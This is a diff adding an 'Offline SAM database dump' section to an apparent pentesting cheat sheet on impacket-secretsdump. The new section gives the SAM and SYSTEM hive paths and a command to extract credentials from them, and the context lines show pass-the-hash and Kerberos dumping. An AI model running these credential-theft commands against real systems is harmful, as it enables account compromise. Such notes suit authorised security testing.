@@ -32,3 +32,15 @@ impacket-secretsdump -hashes :$nt_hash $domain/$user@$host
 export KRB5CCNAME=$tgt_ccache_file
 impacket-secretsdump $hostname -k -no-pass -dc-ip $dc_ipyar
 ```
+
+## Offline SAM database dump
+
+You can also steal SAM database file and SYSTEM registry hive and extract credentials offline:
+
+- SAM: `C:\Windows\System32\config\SAM`
+- SYSTEM: `C:\Windows\System32\config\SYSTEM`
+
+```bash
+# Dump credentials from local SAM and SYSTEM file
+impacket-secretsdump -sam $sam_file -system $system_file LOCAL
+```
